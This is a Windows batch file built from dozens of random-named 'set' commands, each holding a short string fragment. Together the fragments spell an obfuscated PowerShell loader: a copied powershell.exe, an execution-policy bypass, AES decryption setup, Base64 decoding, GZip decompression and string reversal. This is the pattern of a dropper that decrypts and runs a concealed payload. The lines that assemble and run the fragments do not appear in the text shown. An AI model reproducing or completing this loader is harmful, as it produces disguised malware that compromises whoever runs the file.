@echo off
set "uoBgMEdDQf=\v"
set "JaMQQFjMEy=em"
set "tIWiqMPkWa=Sy"
set "BEUUVCioQA=he"
set "dXFhAneMRW=.e"
set "krqbUaELrC=ll"
set "DdGxWtbqfc=do"
set "hXlKmURhHH=we"
set "EcOubsWgrK=in"
set "kTRwuHmlRk=po"
set "WxBPIrzjCW=xe"
set "VuexykGeSA=we"
set "cqRDQgeCFS=py"
set "wnPOMMeTII=co"
set "ayhWcVZfhW= C"
set "WNrDOZXUDU=he"
set "ZeDYhrBrjY=Wi"
set "XxEEbcIFFS=\W"
set "WDgLUbjJae=Po"
set "dXebxddCvQ=32"
set "GsyxvYgSLQ=nd"
set "crostahcNc= /"
set "XPwEwlwiON=ws"
set "bszDVOFjYP=rS"
set "WWEMxKcyIV=0\"
set "EDAxYEYNuI=y "
set "huPMqCSgnm=ll"
set "MZLLDNIAEt=ow"
set "foIrYxXduT=:\"
set "uXOeFxKOJb=rs"
set "wZLliuFHWm=1."
set "iaiMTWUjOK=s\"
set "rfrDgasSuu=st"
set "UKSCSozerW=cd"
set "ekOwtOQFjG= %~dp0"
set "MImCQsteOW=rtS4"
set "ZxgrfSGHMt=lit("
set "rrPWSiMOEp=$LNR"
set "kbSRELtmnz=ptog"
set "nChsozEebT=:: '"
set "bVDtsrNxGN=)) {"
set "XgWKAJDRlG=Comp"
set "zwDXjdbosR=TWJl"
set "uJPKAyzKqn=tem."
set "wzViZRJsaH=.Cry"
set "vQDjkklxic=;$as"
set "pCjzJGFDtI=Obje"
set "rvkcLwebRX=1..-"
set "iPuVTCuAWI=.Sec"
set "TmbADENDlQ=gnir"
set "TTFHAWYFon=1] -"
set "VJCWxAuQrO=EYC "
set "AbMYZNKKyc=PTtG"
set "qpuSTkWddH=am;$"
set "AXieXOnxcs=.Cry"
set "MNchYlljYi=y.Pa"
set "MZnjGxQdvG=F'[-"
set "pDSblWbbhe=eXmG"
set "VAKYCDTdFn=[Sys"
set "gkCVHEhhsM=L4Yi"
set "EmzBjAPlAb=$TWJ"
set "grYeRUudwL=join"
set "lWNEAjNznN=esMa"
set "CCioymnhKP=pher"
set "UJtBkTjCUa=-joi"
set "MQHzHOEgGX=]::("
set "FYtOsHvVgX=-ep "
set "aBdwuvTnZL=Comp"
set "zoSOyrVkXc=nage"
set "dshPlGrRYp=fore"
set "ODdbADiWyo=stem"
set "eSTUylpfTC=W = "
set "CCzOcilUqR=lBlo"
set "UgVEBIhVhx=.Cre"
set "xZriHKlQbY=Conv"
set "jAHrbMUNOt=New-"
set "iUImwGqbQV=jfpI"
set "YsdBehYPIo=ion."
set "eWfqjPtRhC=ect "
set "WTQdSiDIjq=oArr"
set "QhCbeAUidA=EYC."
set "dVirePZaFA=.GZi"
set "PKEZUsfUjB=ispo"
set "vJAdpBxYgv=KNgK"
set "CcgXximxzD=trea"
set "gorTdwdeMM=asYM"
set "BiqnQktErg=yste"
set "eBiVlvpRKx=raph"
set "AogltjqKSP=tem."
set "soLlubnYln=..-1"
set "fEHcMhvaIt=m(, "
set "AbwnCZifbk=zHhH"
set "UvNeSyEOmK=Star"
set "UuMNmFULAY=TllA"
set "dVPkcOIoHH=Syst"
